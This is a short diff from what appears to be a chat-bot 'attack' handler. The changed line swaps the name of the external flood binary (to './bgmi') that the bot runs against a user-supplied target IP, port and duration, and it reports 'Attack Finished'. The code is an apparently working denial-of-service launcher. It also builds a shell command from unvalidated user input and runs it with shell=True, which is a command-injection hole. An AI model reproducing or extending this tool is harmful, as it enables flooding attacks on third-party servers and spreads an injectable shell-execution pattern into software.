@@ -242,7 +242,7 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sahil {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"attack Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
